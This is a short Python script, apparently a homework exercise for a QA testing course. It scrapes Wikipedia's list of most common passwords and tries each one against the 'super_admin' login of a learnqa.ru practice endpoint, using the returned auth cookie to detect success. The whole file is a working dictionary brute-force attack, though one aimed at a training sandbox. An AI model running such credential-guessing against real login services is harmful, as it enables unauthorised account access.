import json
import requests
import time
import requests
from lxml import html

password_lst = []

# парсинг HTML код по XPath
response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
tree = html.fromstring(response.text)
locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[' \
          '@align="left"]/text() '
passwords = tree.xpath(locator)
for password in passwords:
    password_lst.append(str(password).strip())


def unique(password_lst):
    output = []
    for x in password_lst:
        if x not in output:
            output.append(x)
    return output


request_body = {"login": "super_admin", "password": "passwordName"}
for pas in unique(password_lst):
    # print(pas)
    request_body["password"] = pas
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=request_body)
    cook = response.cookies.get("auth_cookie")
    cookies = {"auth_cookie": cook}
    response = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if "You are NOT authorized" != response.text:
        print(f'password = {request_body["password"]}', response.text, sep="\n")
